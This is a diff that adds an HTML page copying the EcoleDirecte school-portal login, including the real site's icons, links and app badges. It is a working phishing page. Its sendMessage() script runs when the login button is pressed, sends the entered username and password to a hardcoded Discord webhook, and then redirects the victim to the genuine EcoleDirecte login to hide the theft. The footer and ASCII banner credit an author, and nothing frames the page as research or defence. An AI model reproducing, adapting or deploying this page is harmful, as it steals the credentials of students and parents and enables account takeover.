@@ -1,0 +1,122 @@
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="Icon" type="image/x-icon" href="https://www.totalbug.com/wp-content/uploads/2019/09/ecole-directe.png">
+  <title>EcoleDirecte</title>
+</head>
+<body>
+  </div>
+  <span id="root">
+    <section class="section-all">
+      <link rel="stylesheet" href="css.css">
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="sur" src="https://f.eu1.jwwb.nl/public/k/n/l/temp-ikxwugxwbgbsqblclcaw/xdojk1/screenshot_2022-04-08-21-56-08-44_40deb401b9ffe8e1df2f1cc5ba480b122.jpg" alt="logo2">
+                  <img class="logo" src="https://f.eu1.jwwb.nl/public/k/n/l/temp-ikxwugxwbgbsqblclcaw/logo2.png" alt="logo">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                  <form class="form">
+                    <div class="input-box">
+                      <input type="text" id="username" placeholder="Identifiant" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                    </div> <div class="jw-element-spacer-container " style="height: 60px"></div>
+                    <div class="input-box">
+                      <input type="password" name="password" id="password" placeholder="Mot de passe" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    </div>  
+                    <a class="forgot" href="https://www.ecoledirecte.com/recuplogin">Mot de passe oublié ?</a>
+                    <img class="sur3" src="https://f.eu1.jwwb.nl/public/k/n/l/temp-ikxwugxwbgbsqblclcaw/xdojk1/screenshot_2022-04-08-21-56-08-44_40deb401b9ffe8e1df2f1cc5ba480b122.jpg" alt="logo2">
+                    <span class="button-box">
+                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Connexion</button>
+                    </span>  
+
+                  </form>
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+
+              </div> <!-- Signup-box end -->
+              <img class="sur3" src="https://media.discordapp.net/attachments/959865816445227189/962657227334877204/prbl_de_co2.png" alt="Poblemedeconnexion">
+              <div class="app">
+                <p>Retrouvez EcoleDirecte aussi sur votre mobile</p>
+                <div class="app-img">
+                  <a href="https://play.google.com/store/apps/developer?id=Aplim">
+                    <img src="https://www.ecoledirecte.com/assets/images/play-store.png">
+                  </a>  
+                  <a href="https://itunes.apple.com/fr/developer/aplim/id466797731">
+                    <img src="https://www.ecoledirecte.com/assets/images/appstore.png" >
+                  </a>
+                </div>  <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+            </ul>
+          </nav>
+
+          <span class="footer-logo">&copy by mfr   <3 </span>
+        </div> <!-- Footer container end -->
+      </footer>
+      
+    </section>
+  </span> <!-- Root -->
+
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+
+  <script>
+  function sendMessage() {
+  function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/961348413688016897/Uzy1k4afBzOFkgL5XDOf9hJ0uuQDATiS24jexy933l50j-pWShadt__3AyKAiLOrszop");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+    }
+    request.send(JSON.stringify(params));
+	sleep(400)
+	window.location.replace("https://www.ecoledirecte.com/login?cameFrom=%2FAccueil");
+  }
+  </script>
+</body>
+<!----------------------------------------------------------------------------------------------------------------------------------------
+
+BBBBBBBBBBBBBBBBB    YYYYYYY       YYYYYYY                 MMMMMMMM               MMMMMMMM FFFFFFFFFFFFFFFFFFFFFF RRRRRRRRRRRRRRRRR   
+B::::::::::::::::B   Y:::::Y       Y:::::Y                 M:::::::M             M:::::::M F::::::::::::::::::::F R::::::::::::::::R  
+B::::::BBBBBB:::::B  Y:::::Y       Y:::::Y                 M::::::::M           M::::::::M F::::::::::::::::::::F R::::::RRRRRR:::::R 
+BB:::::B     B:::::B Y::::::Y     Y::::::Y                 M:::::::::M         M:::::::::M FF::::::FFFFFFFFF::::F RR:::::R     R:::::R
+  B::::B     B:::::B YYY:::::Y   Y:::::YYY                 M::::::::::M       M::::::::::M  F:::::F       FFFFFF  R::::R     R:::::R
+  B::::B     B:::::B    Y:::::Y Y:::::Y                    M:::::::::::M     M:::::::::::M  F:::::F                R::::R     R:::::R
+  B::::BBBBBB:::::B      Y:::::Y:::::Y                     M:::::::M::::M   M::::M:::::::M  F::::::FFFFFFFFFF      R::::RRRRRR:::::R 
+  B:::::::::::::BB        Y:::::::::Y      --------------- M::::::M M::::M M::::M M::::::M  F:::::::::::::::F      R:::::::::::::RR  
+  B::::BBBBBB:::::B        Y:::::::Y       -:::::::::::::- M::::::M  M::::M::::M  M::::::M  F:::::::::::::::F      R::::RRRRRR:::::R 
+  B::::B     B:::::B        Y:::::Y        --------------- M::::::M   M:::::::M   M::::::M  F::::::FFFFFFFFFF      R::::R     R:::::R
+  B::::B     B:::::B        Y:::::Y                        M::::::M    M:::::M    M::::::M  F:::::F                R::::R     R:::::R
+  B::::B     B:::::B        Y:::::Y                        M::::::M     MMMMM     M::::::M  F:::::F                R::::R     R:::::R
+BB:::::BBBBBB::::::B        Y:::::Y                        M::::::M               M::::::M FF:::::::FF            RR:::::R     R:::::R
+B:::::::::::::::::B      YYYY:::::YYYY                     M::::::M               M::::::M F::::::::FF            R::::::R     R:::::R
+B::::::::::::::::B       Y:::::::::::Y                     M::::::M               M::::::M F::::::::FF            R::::::R     R:::::R
+BBBBBBBBBBBBBBBBB        YYYYYYYYYYYYY                     MMMMMMMM               MMMMMMMM FFFFFFFFFFF            RRRRRRRR     RRRRRRR
+                                                                                              
+-------------------------------------------------------------------------------------------------------------------------------------- -->
